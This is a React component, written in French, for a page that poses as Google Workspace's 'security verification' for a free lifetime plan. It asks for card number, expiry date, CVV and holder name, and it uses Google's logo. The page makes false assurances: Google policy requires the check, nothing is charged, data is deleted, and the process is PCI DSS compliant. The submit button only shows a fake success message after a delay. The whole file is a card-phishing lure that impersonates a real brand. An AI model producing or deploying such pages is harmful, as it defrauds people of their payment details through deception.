import React, { useState } from 'react';
import headerStyles from '../styles/components/Header.module.css';
import formStyles from '../styles/components/Form.module.css';
import buttonStyles from '../styles/components/Button.module.css';
import securityStyles from '../styles/components/Security.module.css';
import legalStyles from '../styles/components/Legal.module.css';

const VerificationForm = ({ onBack, onComplete }) => {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardName: ''
  });

  const handleInputChange = (field, value) => {
    let formattedValue = value;
    
    if (field === 'cardNumber') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
    } else if (field === 'expiryDate') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/, '$1/');
    } else if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '');
    }
    
    setFormData(prev => ({ ...prev, [field]: formattedValue }));
  };

  return (
    <>
      <button 
        onClick={onBack}
        className={buttonStyles.topBackBtn}
      >
        ←
      </button>

      <div className={headerStyles.header}>
        <div className={headerStyles.logoContainer}>
          <img 
            src="https://done.lu/wp-content/uploads/2020/11/google-workspace-1.svg" 
            alt="Google Workspace" 
            className={headerStyles.workspaceLogo}
          />
        </div>
        <h1 className={headerStyles.title}>Vérification de sécurité</h1>
        <p className={headerStyles.description}>
          Conformément aux politiques de Google, une vérification d'identité est requise pour activer 
          votre compte Google Workspace Personnel.
        </p>
      </div>

      <div className={formStyles.twoColumnLayout}>
        <div className={formStyles.leftColumn}>
          <div className={formStyles.planSummaryCard}>
            <div className={formStyles.planSummaryHeader}>
              <h3 className={formStyles.planSummaryTitle}>Personnel</h3>
              <div className={formStyles.planSummaryPrice}>
                <span className={formStyles.price}>0€</span>
                <span className={formStyles.period}>/mois</span>
              </div>
              <p className={formStyles.planSummaryDescription}>Gratuit à vie</p>
            </div>
          </div>

          <div className={legalStyles.legalInfo}>
            <h4 className={legalStyles.legalTitle}>Conditions de vérification</h4>
            <ul className={legalStyles.legalList}>
              <li>Aucun montant ne sera prélevé de votre compte</li>
              <li>Vérification instantanée par les systèmes Google</li>
              <li>Vos données sont immédiatement supprimées après vérification</li>
              <li>Processus conforme aux standards bancaires PCI DSS</li>
              <li>Activation immédiate de votre compte après vérification</li>
              <li>Service gratuit à vie sans engagement</li>
            </ul>
          </div>
        </div>

        <div className={formStyles.rightColumn}>
          <div className={formStyles.paymentFormCard}>
            <h3 className={formStyles.paymentFormTitle}>Vérification d'identité</h3>
            
            <div className={formStyles.formGroup}>
              <label className={formStyles.formLabel}>Numéro de carte bancaire</label>
              <input 
                type="text" 
                className={formStyles.formInput}
                placeholder="1234 5678 9012 3456"
                value={formData.cardNumber}
                onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                maxLength="19"
              />
            </div>

            <div className={formStyles.formRow}>
              <div className={formStyles.formGroup}>
                <label className={formStyles.formLabel}>Date d'expiration</label>
                <input 
                  type="text" 
                  className={formStyles.formInput}
                  placeholder="MM/AA"
                  value={formData.expiryDate}
                  onChange={(e) => handleInputChange('expiryDate', e.target.value)}
                  maxLength="5"
                />
              </div>
              <div className={formStyles.formGroup}>
                <label className={formStyles.formLabel}>Code CVV</label>
                <input 
                  type="text" 
                  className={formStyles.formInput}
                  placeholder="123"
                  value={formData.cvv}
                  onChange={(e) => handleInputChange('cvv', e.target.value)}
                  maxLength="4"
                />
              </div>
            </div>

            <div className={formStyles.formGroup}>
              <label className={formStyles.formLabel}>Nom du titulaire</label>
              <input 
                type="text" 
                className={formStyles.formInput}
                placeholder="Jean Dupont"
                value={formData.cardName}
                onChange={(e) => handleInputChange('cardName', e.target.value)}
              />
            </div>

            <p className={securityStyles.trialNotice}>
              Vérification instantanée • Aucun débit • Données chiffrées
            </p>

            <button 
              onClick={() => {
                setTimeout(() => {
                  alert('Vérification réussie ! Redirection vers votre espace Google Workspace...');
                  onComplete();
                }, 1500);
              }}
              className={`${buttonStyles.planBtn} ${buttonStyles.primaryBtn}`}
            >
              Vérifier mon identité
            </button>
          </div>
        </div>
      </div>
    </>
  );
};

export default VerificationForm;
